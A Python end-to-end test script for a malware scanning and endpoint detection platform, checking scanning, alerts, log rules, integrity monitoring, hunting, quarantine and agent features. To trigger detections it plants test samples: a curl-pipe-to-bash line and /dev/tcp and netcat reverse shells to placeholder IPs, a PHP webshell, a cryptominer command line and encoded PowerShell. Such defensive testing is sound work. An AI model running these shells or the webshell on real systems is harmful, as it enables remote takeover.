#!/usr/bin/env python3
"""End-to-end verification of every Malware Scan workflow against a live server.

Run the API first:
    MALWARESCAN_ADMIN_PASSWORD='E2eAdmin!12345' python -m uvicorn malwarescan.main:app --port 8000
Then:
    python scripts/e2e_test.py [--base http://127.0.0.1:8000]

Exits non-zero on the first failed check. Every step asserts REAL results
(no mocks): scans run the engine, quarantine encrypts files on disk, FIM
touches the filesystem, log rules parse real lines.
"""
from __future__ import annotations

import base64
import json
import os
import sys
import tempfile
import time
from pathlib import Path

import httpx

BASE = "http://127.0.0.1:8000"
ADMIN = {"username": "admin", "password": os.environ.get("E2E_ADMIN_PASSWORD", "E2eAdmin!12345")}
RUN = str(int(time.time()))[-6:]
EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

passed = 0
failed: list[str] = []


def check(name: str, cond: bool, detail: str = "") -> None:
    global passed
    if cond:
        passed += 1
        print(f"  ✔ {name}")
    else:
        failed.append(name)
        print(f"  ✘ {name} — {detail}")


def section(title: str) -> None:
    print(f"\n=== {title} ===")


def main() -> int:
    if "--base" in sys.argv:
        global BASE
        BASE = sys.argv[sys.argv.index("--base") + 1]
    c = httpx.Client(base_url=BASE, timeout=60)

    # -------------------------------------------------------------- health
    section("Health & readiness")
    r = c.get("/api/health")
    check("GET /api/health", r.status_code == 200 and r.json()["status"] == "ok", r.text[:200])
    r = c.get("/api/health/ready")
    check("GET /api/health/ready", r.status_code == 200 and r.json()["status"] == "ready", r.text[:300])
    r = c.get("/api/openapi.json")
    check("OpenAPI schema generated", r.status_code == 200 and "paths" in r.json())

    # -------------------------------------------------------------- auth
    section("Authentication & RBAC")
    r = c.post("/api/auth/login", json=ADMIN)
    check("admin login", r.status_code == 200 and r.json().get("token"), r.text[:200])
    token = r.json()["token"]
    ah = {"Authorization": f"Bearer {token}"}
    r = c.post("/api/auth/login", json={"username": "admin", "password": "wrong-password"})
    check("wrong password rejected", r.status_code == 401)
    r = c.get("/api/auth/me", headers=ah)
    check("GET /api/auth/me", r.status_code == 200 and r.json()["user"]["role"] == "admin")

    # register a viewer (self-registration allowed by default)
    viewer = {"username": f"e2e_viewer_{RUN}", "email": f"viewer{RUN}@example.com", "password": "ViewerPass!123"}
    r = c.post("/api/auth/register", json=viewer)
    check("viewer registration", r.status_code == 200 and r.json()["user"]["role"] == "viewer", r.text[:200])
    vh = {"Authorization": f"Bearer {r.json()['token']}"} if r.status_code == 200 else {}
    r = c.get("/api/admin/users", headers=vh)
    check("viewer blocked from admin (403)", r.status_code == 403, f"got {r.status_code}")
    r = c.post("/api/scans/upload", headers=vh, files={"file": ("x.txt", b"x")})
    check("viewer blocked from scan:write (403)", r.status_code == 403, f"got {r.status_code}")
    r = c.get("/api/dashboard/overview", headers={})
    check("unauthenticated request rejected (401)", r.status_code == 401)

    # analyst role via admin user-management
    r = c.post("/api/admin/users", headers=ah, json={
        "username": f"e2e_analyst_{RUN}", "email": f"analyst{RUN}@example.com",
        "password": "AnalystPass!123", "role": "analyst"})
    check("admin creates analyst", r.status_code == 200, r.text[:200])
    r = c.post("/api/auth/login", json={"username": f"e2e_analyst_{RUN}", "password": "AnalystPass!123"})
    anh = {"Authorization": f"Bearer {r.json()['token']}"}
    r = c.post("/api/scans/test-samples", headers=anh, json={"kind": "benign_text"})
    check("analyst can submit scans", r.status_code == 200, r.text[:200])

    # -------------------------------------------------------------- scanning
    section("File scanning workflows")
    r = c.post("/api/scans/test-samples", headers=ah, json={"kind": "eicar"})
    check("EICAR test sample created", r.status_code == 200, r.text[:200])
    eicar_scan_id = r.json()["scan_id"]

    def wait_scan(sid: int, timeout: int = 60) -> dict:
        end = time.time() + timeout
        while time.time() < end:
            d = c.get(f"/api/scans/{sid}", headers=ah).json()
            if d["status"] in ("done", "error"):
                return d
            time.sleep(0.4)
        return {"status": "timeout"}

    d = wait_scan(eicar_scan_id)
    check("EICAR verdict=malicious severity=info", d.get("verdict") == "malicious" and d.get("severity") == "info",
          json.dumps(d)[:300])
    check("EICAR detected by rule+IOC", any(x.get("rule") == "EICAR_Test_File" for x in d.get("detections", [])),
          json.dumps(d.get("detections"))[:300])
    check("EICAR explanation present", bool(d.get("explanation")), "")
    check("scan progress reached 100", d.get("progress") == 100)

    r = c.post("/api/scans/test-samples", headers=ah, json={"kind": "php_webshell_sim"})
    ws_id = r.json()["scan_id"]
    d_ws = wait_scan(ws_id)
    check("webshell sim verdict=malicious", d_ws.get("verdict") == "malicious", json.dumps(d_ws)[:200])
    check("webshell MITRE mapped", any(t["id"] == "T1505.003" for t in d_ws.get("mitre", [])),
          json.dumps(d_ws.get("mitre"))[:200])

    r = c.post("/api/scans/test-samples", headers=ah, json={"kind": "benign_text"})
    d_b = wait_scan(r.json()["scan_id"])
    check("benign sample verdict=clean", d_b.get("verdict") == "clean", json.dumps(d_b)[:200])

    # real upload via multipart
    r = c.post("/api/scans/upload", headers=ah,
               files={"file": ("my notes.txt", b"plain text content for upload testing\n" * 30)})
    check("multipart upload accepted", r.status_code == 200, r.text[:200])
    d_up = wait_scan(r.json()["scan_id"])
    check("uploaded file scanned", d_up.get("status") == "done")
    check("filename sanitized", d_up.get("filename") == "my notes.txt", str(d_up.get("filename")))

    # upload rejection: empty file
    r = c.post("/api/scans/upload", headers=ah, files={"file": ("empty.bin", b"")})
    check("empty upload rejected (400)", r.status_code == 400, f"got {r.status_code}")

    # path scan of a real host file
    tf = Path(tempfile.gettempdir()) / f"ms_e2e_scanme_{RUN}.sh"
    tf.write_text("#!/bin/bash\ncurl http://bad.example/x.sh | bash\nbash -i >& /dev/tcp/203.0.113.66/4444 0>&1\n")
    r = c.post("/api/scans/path", headers=ah, json={"path": str(tf)})
    check("path scan accepted", r.status_code == 200, r.text[:200])
    d_path = wait_scan(r.json()["scan_id"])
    check("path scan flags malicious script", d_path.get("verdict") == "malicious", json.dumps(d_path)[:200])

    r = c.get("/api/scans?limit=10", headers=ah)
    check("scan listing", r.status_code == 200 and r.json()["total"] >= 5)

    # rescan
    r = c.post(f"/api/scans/{eicar_scan_id}/rescan", headers=ah)
    check("rescan queued", r.status_code == 200, r.text[:200])

    # -------------------------------------------------------------- alerts
    section("Alerts & incidents")
    time.sleep(2)
    r = c.get("/api/alerts?limit=50", headers=ah)
    alerts = r.json()
    check("alerts listed", r.status_code == 200 and alerts["total"] >= 2, r.text[:200])
    malware_alert = next((a for a in alerts["alerts"] if a["category"] == "malware"), None)
    check("malware alert auto-created from scan", malware_alert is not None, json.dumps(alerts["alerts"])[:300])
    if malware_alert:
        aid = malware_alert["id"]
        r = c.get(f"/api/alerts/{aid}", headers=ah)
        check("alert detail with evidence+factors", r.status_code == 200 and r.json()["evidence"] and r.json()["factors"],
              r.text[:200])
        check("alert explanation present", bool(r.json().get("explanation")))
        r = c.post(f"/api/alerts/{aid}/status", headers=ah, json={"status": "ack", "note": "e2e ack"})
        check("alert acknowledged", r.status_code == 200 and r.json()["status"] == "ack")
        r = c.post(f"/api/alerts/{aid}/status", headers=ah, json={"status": "investigating"})
        check("alert moved to investigating", r.json().get("status") == "investigating")

    # false-positive workflow + suppression
    r = c.post("/api/logs/ingest", headers=ah, json={
        "lines": ["Sep 1 10:00:01 host CRON[123]: (root) CMD (run-parts /etc/cron.hourly)"], "source": "e2e-noise"})
    fp_target = None
    r = c.get("/api/alerts?limit=50", headers=ah)
    if r.json()["alerts"]:
        fp_target = r.json()["alerts"][-1]["id"]
    if fp_target:
        r = c.post(f"/api/alerts/{fp_target}/status", headers=ah, json={
            "status": "false_positive", "fp_reason": "e2e test", "create_suppression": True})
        check("false-positive + suppression created", r.status_code == 200 and r.json()["status"] == "false_positive",
              r.text[:200])
    r = c.get("/api/alerts/suppressions/list", headers=ah)
    check("suppression listed", r.status_code == 200 and r.json()["items"], r.text[:150])
    if r.json()["items"]:
        sid = r.json()["items"][0]["id"]
        c.delete(f"/api/alerts/suppressions/{sid}", headers=ah)

    # incident correlation: push several critical log events on same agent
    r = c.post("/api/logs/ingest", headers=ah, json={"lines": [
        "Oct 1 09:00:00 srv sshd[900]: Accepted password for root from 203.0.113.9 port 5555 ssh2",
        "Oct 1 09:00:05 srv kernel: audit log was cleared by attacker tooling",
        "Oct 1 09:00:09 srv sudo: hacker : user NOT in sudoers ; TTY=pts/0 ; COMMAND=/bin/bash",
    ], "source": "e2e-auth"})
    check("log ingest accepted+matched", r.status_code == 200 and r.json()["matched"] >= 2, r.text[:200])
    time.sleep(1)
    r = c.get("/api/incidents", headers=ah)
    check("incident auto-created from correlated critical alerts", r.json()["total"] >= 1, r.text[:300])
    if r.json()["incidents"]:
        iid = r.json()["incidents"][0]["id"]
        d = c.get(f"/api/incidents/{iid}", headers=ah).json()
        check("incident timeline populated", len(d.get("timeline", [])) >= 1, json.dumps(d)[:200])
        r = c.post(f"/api/incidents/{iid}", headers=ah, json={"status": "investigating", "note": "e2e"})
        check("incident status update", r.json().get("status") == "investigating")

    # -------------------------------------------------------------- logs
    section("Log monitoring & analysis")
    lines = [f"Oct 1 10:00:{i:02d} srv sshd[100{i}]: Failed password for invalid user tester{i} from 203.0.113.7 port 4000{i} ssh2"
             for i in range(12)]
    r = c.post("/api/logs/ingest", headers=ah, json={"lines": lines, "source": "e2e-bruteforce"})
    check("brute-force burst ingested", r.json()["matched"] == 12, r.text[:200])
    check("brute-force alerts raised for burst", len(r.json()["alert_ids"]) >= 1, r.text[:200])
    r = c.get("/api/alerts?search=brute", headers=ah)
    check("escalated brute-force alert present", r.json()["total"] >= 1, r.text[:300])
    r = c.post("/api/logs/test-match", headers=ah, json={"line": "powershell.exe -EncodedCommand SQBFAFgA"})
    check("rule test-match dry run", r.json()["result"]["matched_rule"] == "exec.powershell_encoded", r.text[:200])
    r = c.get("/api/logs/stats", headers=ah)
    check("log stats", r.status_code == 200 and r.json()["total"] > 10)
    r = c.get("/api/logs?q=Failed+password&limit=5", headers=ah)
    check("log search", r.json()["total"] >= 12, r.text[:150])
    # EVE import (optional integration path, real parser)
    r = c.post("/api/logs/ingest/eve", headers=ah, json={"events": [{
        "timestamp": "2026-01-01T10:00:00Z", "event_type": "alert",
        "src_ip": "203.0.113.5", "dest_ip": "10.0.0.5", "src_port": 4444, "dest_port": 80, "proto": "TCP",
        "alert": {"signature_id": 2026001, "signature": "ET TEST Simulated Alert", "category": "test", "severity": 2}}]})
    check("Suricata EVE-JSON import", r.status_code == 200 and r.json()["alerts_created"] == 1, r.text[:200])

    # -------------------------------------------------------------- FIM
    section("File Integrity Monitoring")
    watch = Path(tempfile.gettempdir()) / f"ms_e2e_fim_{RUN}"
    watch.mkdir(exist_ok=True)
    (watch / "app.conf").write_text("setting=1\n")
    r = c.post("/api/fim/watch-paths", headers=ah, json={"paths": [str(watch)]})
    check("watch paths configured", r.status_code == 200, r.text[:150])
    r = c.post("/api/fim/baseline-reset", headers=ah, json={})
    check("baseline created", r.json().get("baselined_files", 0) >= 1, r.text[:150])
    (watch / "app.conf").write_text("setting=EVIL\n")
    (watch / "backdoor.sh").write_text("#!/bin/sh\nnc -e /bin/sh 203.0.113.66 4444\n")
    r = c.post("/api/fim/scan-now", headers=ah, json={})
    s = r.json()
    check("FIM detects modification + addition", s.get("modified", 0) >= 1 and s.get("added", 0) >= 1, json.dumps(s))
    r = c.get("/api/fim/events?limit=10", headers=ah)
    evs = r.json()["events"]
    check("FIM events stored with hashes", any(e["change_type"] == "modified" and e["after_hash"] for e in evs),
          json.dumps(evs)[:300])
    (watch / "backdoor.sh").unlink()
    r = c.post("/api/fim/scan-now", headers=ah, json={})
    check("FIM detects removal", r.json().get("removed", 0) >= 1, r.text[:200])
    r = c.get("/api/fim/inventory?limit=10", headers=ah)
    check("FIM inventory query", r.status_code == 200)

    # -------------------------------------------------------------- vulns & SCA
    section("Vulnerability management & SCA")
    r = c.post("/api/vulnerabilities/rescan", headers=ah, json={})
    check("inventory rescan ran", r.status_code == 200 and "packages_scanned" in r.json(), r.text[:200])
    r = c.get("/api/vulnerabilities?limit=50", headers=ah)
    v = r.json()
    check("vulnerabilities listed (real system tools)", r.status_code == 200, r.text[:200])
    print(f"    (open vulns: {v['total']}, by severity: {v.get('open_by_severity')})")
    if v["vulnerabilities"]:
        vid = v["vulnerabilities"][0]["id"]
        r = c.post(f"/api/vulnerabilities/{vid}/status", headers=ah,
                   json={"status": "risk_accepted", "note": "e2e"})
        check("vuln status workflow", r.json().get("ok"), r.text[:150])
        r = c.get(f"/api/vulnerabilities/{vid}/nvd", headers=ah)
        check("NVD optional-integration honest response", r.status_code == 200 and
              ("error" in r.json() or r.json().get("ok")), r.text[:150])
    r = c.post("/api/sca/run", headers=ah, json={})
    check("SCA assessment ran", r.status_code == 200 and r.json().get("total", 0) > 5, r.text[:200])
    r = c.get("/api/sca", headers=ah)
    check("SCA results include evidence+remediation", r.status_code == 200 and
          all("remediation" in x for x in r.json()["results"][:3]), r.text[:200])
    r = c.get("/api/compliance", headers=ah)
    check("compliance overview", r.status_code == 200 and "families" in r.json(), r.text[:200])

    # -------------------------------------------------------------- network & processes
    section("Network & process monitoring (EDR)")
    r = c.post("/api/network/scan-now", headers=ah)
    check("network tick collected real connections", r.status_code == 200 and r.json()["connections"] >= 0, r.text[:150])
    r = c.get("/api/network/summary", headers=ah)
    check("network summary", r.status_code == 200 and "listeners" in r.json())
    time.sleep(1)
    r = c.get("/api/agents/1/processes?suspicious_only=false&limit=5", headers=ah)
    check("process snapshots stored", r.status_code == 200, r.text[:150])

    # -------------------------------------------------------------- hunt
    section("Threat hunting")
    eicar_sha = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
    r = c.get(f"/api/hunt/hash/{eicar_sha}", headers=ah)
    hh = r.json()
    check("hash hunt finds EICAR across tables", hh["seen_anywhere"] and hh["summary"]["scans"] >= 1,
          json.dumps(hh["summary"]))
    r = c.post("/api/hunt/processes", headers=ah, json={"pattern": "python", "fields": ["name"]})
    check("process hunt regex works", r.status_code == 200 and r.json()["count"] >= 0, r.text[:150])
    sweep_dir = Path(tempfile.gettempdir()) / f"ms_e2e_sweep_{RUN}"
    sweep_dir.mkdir(exist_ok=True)
    (sweep_dir / "webshell.php").write_bytes(b"<?php system($_GET['c']); eval(base64_decode($_POST['x'])); passthru($_REQUEST['y']); ?>")
    (sweep_dir / "clean.txt").write_text("just text\n")
    r = c.post("/api/hunt/yara-sweep", headers=ah, json={"path": str(sweep_dir)})
    sw = r.json()
    check("yara sweep finds planted webshell", any(m["rule"] == "PHP_Webshell_Generic" for m in sw["matches"]),
          json.dumps(sw)[:300])
    r = c.post("/api/hunt/yara-validate", headers=ah, json={
        "source": 'rule TestRule { strings: $a = "needle" condition: any of them }',
        "test_against": "haystack with needle inside"})
    check("custom rule validation + test", r.json().get("ok") and
          r.json()["test_matches"]["TestRule"] == ["$a"], r.text[:200])
    r = c.post("/api/hunt/yara-validate", headers=ah, json={"source": "rule broken { strings: condition: oops }"})
    check("invalid rule rejected", r.json().get("ok") is False, r.text[:150])

    # -------------------------------------------------------------- intelligence
    section("Threat intelligence")
    r = c.post("/api/intelligence/iocs", headers=ah, json={
        "type": "ip", "value": "198.51.100.23", "source": "e2e", "confidence": 90, "tags": "test"})
    check("IOC added", r.status_code == 200, r.text[:150])
    ioc_id = r.json()["id"]
    r = c.post("/api/intelligence/iocs", headers=ah, json={"type": "ip", "value": "not-an-ip"})
    check("invalid IOC rejected (400)", r.status_code == 400)
    r = c.get("/api/intelligence/iocs", headers=ah)
    check("IOC list incl. builtin pack", r.json()["total"] >= 1 and r.json()["builtin_pack"]["count"] >= 8,
          json.dumps(r.json().get("builtin_pack", {}).get("count")))
    r = c.get("/api/intelligence/feeds", headers=ah)
    check("feed status honest about optional integration", r.json()["status"] in ("configured", "not-configured"))
    c.delete(f"/api/intelligence/iocs/{ioc_id}", headers=ah)

    # IOC hash matching on a real scan: add an MD5 IOC for a custom file, rescan, expect db-ioc hit
    r = c.post("/api/scans/upload", headers=ah, files={"file": ("ioc_test.bin", b"unique-e2e-ioc-content-12345")})
    ioc_scan = r.json()
    import hashlib
    md5 = hashlib.md5(b"unique-e2e-ioc-content-12345").hexdigest()
    r = c.post("/api/intelligence/iocs", headers=ah, json={
        "type": "hash", "value": md5, "source": "e2e", "confidence": 95, "tags": "e2e"})
    check("custom hash IOC added (or already present from a prior run)", r.status_code in (200, 409), r.text[:150])
    r = c.post(f"/api/scans/{ioc_scan['scan_id']}/rescan", headers=ah)
    d_ioc = wait_scan(r.json()["scan_id"])
    check("custom IOC matched on rescan", any(x.get("engine") == "db-ioc" for x in d_ioc.get("detections", [])),
          json.dumps(d_ioc.get("detections"))[:300])

    # -------------------------------------------------------------- response & quarantine
    section("Automated response, quarantine & rollback")
    r = c.get("/api/response/playbooks", headers=ah)
    check("playbook catalog", r.status_code == 200 and len(r.json()["playbooks"]) >= 5, r.text[:200])
    # dangerous action without confirmation is refused
    r = c.post("/api/response/execute", headers=ah, json={
        "playbook": "kill_process", "target": "1", "dry_run": False, "confirm": False})
    check("dangerous action requires confirmation", r.json().get("ok") is False and
          r.json().get("requires_confirmation"), r.text[:200])
    r = c.post("/api/response/execute", headers=ah, json={"playbook": "kill_process", "target": "1", "dry_run": True})
    check("PID 1 protected even in dry-run precheck", r.json().get("ok") is False or r.json().get("dry_run"),
          r.text[:200])
    r = c.post("/api/response/execute", headers=ah, json={"playbook": "block_ip", "target": "127.0.0.1", "dry_run": True})
    check("loopback block refused", r.json().get("ok") is False, r.text[:200])
    r = c.post("/api/response/execute", headers=ah, json={"playbook": "block_ip", "target": "203.0.113.66", "dry_run": True})
    bj = r.json()
    check("block_ip dry-run is truthful (preview OR explicit no-backend refusal)",
          (bj.get("ok") is True and "would_execute" in json.dumps(bj)) or
          "no supported firewall backend" in json.dumps(bj), r.text[:300])
    r = c.post("/api/response/execute", headers=ah, json={"playbook": "block_ip", "target": "203.0.113.66", "dry_run": False, "confirm": True})
    check("live block_ip refused without policy opt-in or backend", r.json().get("ok") is False, r.text[:200])
    # quarantine the planted webshell, verify on disk, restore via rollback
    target = sweep_dir / "webshell.php"
    r = c.post("/api/response/execute", headers=ah, json={
        "playbook": "quarantine_file", "target": str(target), "params": {"reason": "e2e webshell"},
        "dry_run": False, "confirm": True})
    q = r.json()
    check("quarantine executed+verified", q.get("ok") and q.get("verification", {}).get("original_removed") is True,
          json.dumps(q)[:300])
    check("original file gone from disk", not target.exists())
    r = c.get("/api/quarantine", headers=ah)
    check("quarantine entry listed (encrypted store)", r.json()["total"] >= 1 and
          Path(r.json()["items"][0]["stored_path"]).exists(), r.text[:200])
    stored = Path(r.json()["items"][0]["stored_path"])
    raw = stored.read_bytes()
    check("quarantine content is encrypted at rest", raw[:5] != b"<?php" and b"system(" not in raw[:200])
    action_id = q["action_id"]
    r = c.post(f"/api/response/actions/{action_id}/rollback", headers=ah, json={})
    check("rollback restores file", r.json().get("ok") is True, r.text[:300])
    check("file back on disk after rollback", target.exists() and b"system(" in target.read_bytes())
    # critical path protection
    r = c.post("/api/response/execute", headers=ah, json={
        "playbook": "quarantine_file", "target": "/etc/hosts", "dry_run": False, "confirm": True})
    check("system-critical path quarantine refused", r.json().get("ok") is False and
          "system-critical" in json.dumps(r.json()), r.text[:300])
    r = c.get("/api/response/actions", headers=ah)
    check("action trail with precheck/verification", r.json()["total"] >= 4 and
          any(a["verification"] for a in r.json()["actions"]), r.text[:200])

    # -------------------------------------------------------------- agents data plane
    section("Agent enrollment & data plane (cross-platform)")
    r = c.post("/api/agents", headers=ah, json={"name": f"e2e-remote-{RUN}", "labels": "e2e"})
    check("enroll token issued", r.status_code == 200 and r.json()["enroll_token"].startswith("msa_"), r.text[:200])
    tok = r.json()["enroll_token"]
    agent_id = r.json()["agent_id"]
    r = c.post("/api/agent/enroll", json={
        "token": tok, "hostname": "remote-e2e", "os": "Linux", "os_version": "6.x", "ip": "10.9.8.7",
        "agent_version": "1.0.0"})
    check("agent enrolled", r.status_code == 200 and r.json()["status"] != "pending", r.text[:200])
    agent_cred = r.json().get("agent_token", "")
    check("agent credential issued once", agent_cred.startswith("msc_"), r.text[:120])
    check("enrollment token is single-use", c.post("/api/agent/enroll", json={"token": tok}).status_code == 401)
    xh = {"X-Agent-Token": agent_cred}
    r = c.post("/api/agent/heartbeat", headers=xh, json={"metrics": {"cpu_percent": 12.5}})
    check("agent heartbeat", r.json().get("ok") and r.json().get("status") == "online", r.text[:150])
    r = c.post("/api/agent/logs", headers=xh, json={"lines": [
        "Oct 2 11:00:00 remote sshd[1]: Failed password for root from 198.51.100.9 port 22 ssh2"]})
    check("agent log push", r.json().get("accepted") == 1, r.text[:150])
    r = c.post("/api/agent/processes", headers=xh, json={"processes": [
        {"pid": 4242, "name": "kworker-miner", "username": "www-data",
         "cmdline": "xmrig --url stratum+tcp://pool.example:3333 --donate-level 1",
         "exe": "/tmp/.x/xmrig", "cpu_percent": 88.0, "memory_mb": 210.0, "connections": 2}]})
    check("agent process push triggers detection", r.json().get("findings", 0) >= 1 and r.json().get("alerts", 0) >= 1,
          r.text[:200])
    r = c.post("/api/agent/scan", headers=xh, json={
        "filename": "remote_eicar.com", "content_b64": base64.b64encode(EICAR).decode()})
    check("agent remote scan submission", r.status_code == 200, r.text[:150])
    d_ag = wait_scan(r.json()["scan_id"])
    check("agent-submitted EICAR scanned malicious", d_ag.get("verdict") == "malicious", json.dumps(d_ag)[:150])
    # isolation
    r = c.post("/api/response/execute", headers=ah, json={
        "playbook": "isolate_agent", "target": str(agent_id), "dry_run": False, "confirm": True})
    check("agent isolation", r.json().get("ok"), r.text[:200])
    r = c.post("/api/agent/heartbeat", headers=xh, json={"metrics": {}})
    check("isolated flag delivered to agent", r.json().get("isolated") is True, r.text[:150])
    r = c.post("/api/response/execute", headers=ah, json={
        "playbook": "release_agent", "target": str(agent_id), "dry_run": False, "confirm": True})
    check("agent released", r.json().get("ok"), r.text[:150])

    # -------------------------------------------------------------- MITRE
    section("MITRE ATT&CK mapping")
    r = c.get("/api/mitre", headers=ah)
    m = r.json()
    check("ATT&CK matrix served with tactics", r.status_code == 200 and len(m["tactics"]) >= 10 and m["total"] >= 40,
          r.text[:150])
    check("techniques show real coverage counts", any(t["alert_count"] > 0 for t in m["techniques"]),
          json.dumps(m["techniques"][:3]))

    # -------------------------------------------------------------- assistant
    section("AI investigation assistant")
    r = c.post("/api/assistant/ask", headers=ah, json={"question": "top threats right now"})
    a = r.json()
    check("assistant answers top threats from DB", r.status_code == 200 and
          ("Top unresolved threats" in a.get("answer", "") or "No unresolved alerts" in a.get("answer", "")),
          a.get("answer", "")[:150])
    check("assistant reports local mode honestly", "local" in a.get("mode", ""), a.get("mode", ""))
    if malware_alert:
        r = c.post("/api/assistant/ask", headers=ah, json={"question": f"explain alert {malware_alert['id']}"})
        check("assistant explains alert with factors", "Why it fired" in r.json()["answer"] or
              "Alert #" in r.json()["answer"], r.json()["answer"][:200])
    r = c.post("/api/assistant/ask", headers=ah, json={"question": f"find hash {eicar_sha}"})
    check("assistant hash hunt", "Hash hunt" in r.json()["answer"], r.json()["answer"][:150])
    r = c.post("/api/assistant/ask", headers=ah, json={"question": "which vulnerabilities are open?"})
    check("assistant vuln query", "vulnerabilit" in r.json()["answer"].lower(), r.json()["answer"][:150])
    r = c.post("/api/assistant/ask", headers=ah, json={"question": "compliance posture"})
    check("assistant compliance query", "pass" in r.json()["answer"].lower() or "fail" in r.json()["answer"].lower(),
          r.json()["answer"][:150])
    r = c.get("/api/assistant/status", headers=ah)
    check("assistant status shows optional LLM state", "external_llm_configured" in r.json(), r.text[:150])

    # -------------------------------------------------------------- reports
    section("Reports")
    for fmt in ("html", "json", "csv"):
        r = c.post("/api/reports/generate", headers=ah, json={"format": fmt, "days": 7})
        check(f"{fmt} report generated", r.json().get("ok"), r.text[:150])
        rid = r.json()["id"]
        r = c.get(f"/api/reports/{rid}/download", headers=ah)
        check(f"{fmt} report downloads", r.status_code == 200 and len(r.content) > 200)
    r = c.get("/api/reports", headers=ah)
    check("report listing", len(r.json()["reports"]) >= 3)
    r = c.get(f"/api/reports/{rid}/download", headers=vh)
    check("viewer can read reports", r.status_code == 200)
    html = c.post("/api/reports/generate", headers=ah, json={"format": "html", "days": 7}).json()
    content = c.get(f"/api/reports/{html['id']}/download", headers=ah).text
    check("report contains real data + limitations statement", "Limitations" in content and "EICAR" in content or "eicar" in content.lower(),
          content[:150])

    # -------------------------------------------------------------- dashboard & admin
    section("Dashboard & admin controls")
    r = c.get("/api/dashboard/overview", headers=ah)
    o = r.json()
    check("dashboard overview aggregates", r.status_code == 200 and o["scans"]["total"] >= 8 and
          o["alerts"]["total"] >= 5 and len(o["agents"]) >= 2, json.dumps({k: o[k] for k in ("scans", "alerts")})[:250])
    check("dashboard includes live host metrics", o["host_metrics"].get("cpu_percent") is not None,
          json.dumps(o["host_metrics"])[:150])
    r = c.get("/api/dashboard/timeline?hours=24", headers=ah)
    check("dashboard timeline", r.status_code == 200 and len(r.json()["alerts"]) >= 1)
    r = c.get("/api/dashboard/incident-feed", headers=ah)
    check("incident feed merges events", len(r.json()["events"]) >= 5)
    r = c.get("/api/admin/audit?limit=50", headers=ah)
    check("audit trail recorded actions", r.json()["total"] >= 15, str(r.json()["total"]))
    r = c.get("/api/admin/rules", headers=ah)
    rr = r.json()
    check("rules status + integrity manifest", rr["status"]["yara_rules"] >= 20 and rr["integrity"]["ok"] is True,
          json.dumps(rr["integrity"])[:200])
    r = c.post("/api/admin/rules/reload", headers=ah)
    check("rules hot reload", r.json().get("ok"))
    r = c.post("/api/admin/rules/custom", headers=ah, json={
        "filename": f"e2e_custom_{RUN}.yrl",
        "source": 'rule E2E_Marker { meta: severity = "medium" description = "e2e marker" strings: $m = "ZZE2EMARKERZZ" condition: any of them }'})
    check("custom rule upload+reload", r.json().get("ok"), r.text[:200])
    r = c.post("/api/scans/upload", headers=ah, files={"file": ("marker.txt", b"contains ZZE2EMARKERZZ inside")})
    d_m = wait_scan(r.json()["scan_id"])
    check("custom rule detects on next scan", any(x.get("rule") == "E2E_Marker" for x in d_m.get("detections", [])),
          json.dumps(d_m.get("detections"))[:200])
    r = c.get("/api/admin/settings", headers=ah)
    check("settings incl. optional integrations map", "integrations" in r.json(), r.text[:150])
    r = c.post("/api/admin/settings", headers=ah, json={"key": "allow_registration", "value": "false"})
    check("admin toggles registration", r.json().get("ok"))
    r = c.post("/api/auth/register", json={"username": "blocked_user", "email": "b@example.com", "password": "Password!123"})
    check("registration disabled enforced", r.status_code == 403, f"got {r.status_code}")
    c.post("/api/admin/settings", headers=ah, json={"key": "allow_registration", "value": "true"})
    # viewer user disable/enable
    users = c.get("/api/admin/users", headers=ah).json()["users"]
    vrow = next(u for u in users if u["username"] == f"e2e_viewer_{RUN}")
    r = c.post(f"/api/admin/users/{vrow['id']}", headers=ah, json={"is_active": False})
    check("admin disables user", r.json().get("ok"))
    r = c.post("/api/auth/login", json=viewer)
    check("disabled user cannot login (403)", r.status_code == 403, f"got {r.status_code}")
    c.post(f"/api/admin/users/{vrow['id']}", headers=ah, json={"is_active": True, "role": "analyst"})
    r = c.post("/api/auth/login", json=viewer)
    check("role change applied on re-login", r.status_code == 200 and r.json()["user"]["role"] == "analyst")

    # -------------------------------------------------------------- rate limiting
    section("Rate limiting")
    got_429 = False
    for i in range(settings_auth_limit() + 6):
        rr = c.post("/api/auth/login", json={"username": "nobody", "password": "whatever123"})
        if rr.status_code == 429:
            got_429 = True
            break
    check("auth rate limit triggers 429", got_429)

    # -------------------------------------------------------------- risk scoring
    section("Risk scoring")
    r = c.get("/api/agents", headers=ah)
    agents = r.json()["agents"]
    check("agents list with risk + metrics", len(agents) >= 2 and any(a.get("risk") for a in agents),
          json.dumps(agents)[:300])

    section("Regression: every list endpoint with every filter")
    filter_matrix = [
        "/api/alerts?status=new&severity=high&category=malware&search=x",
        "/api/alerts?status=false_positive", "/api/incidents?status=open",
        "/api/quarantine?status=quarantined", "/api/quarantine?status=", "/api/scans?verdict=malicious",
        "/api/logs?severity=high&source=tail&q=x", "/api/fim/events?change_type=modified&severity=high&path_contains=x",
        "/api/fim/inventory?q=etc", "/api/vulnerabilities?status=open&severity=critical&q=x",
        "/api/vulnerabilities?status=all", "/api/sca?status=fail", "/api/sca?latest_only=false&status=pass",
        "/api/network/events?verdict=benign&direction=outbound&q=x", "/api/intelligence/iocs?type=hash&q=x",
        "/api/response/actions?limit=5", "/api/agents", "/api/reports", "/api/admin/audit?result=success&q=x&username=admin",
        "/api/hunt/saved-searches", "/api/dashboard/timeline?hours=48", "/api/compliance", "/api/mitre",
    ]
    for path in filter_matrix:
        r = c.get(path, headers=ah)
        check(f"GET {path}", r.status_code == 200, f"-> {r.status_code} {r.text[:160]}")

    print(f"\n{'='*60}\nE2E RESULT: {passed} passed, {len(failed)} failed")
    if failed:
        print("Failed checks:")
        for f in failed:
            print(f"  - {f}")
        return 1
    return 0


def settings_auth_limit() -> int:
    try:
        return int(os.environ.get("MALWARESCAN_RATE_LIMIT_AUTH", "20"))
    except ValueError:
        return 20


if __name__ == "__main__":
    sys.exit(main())
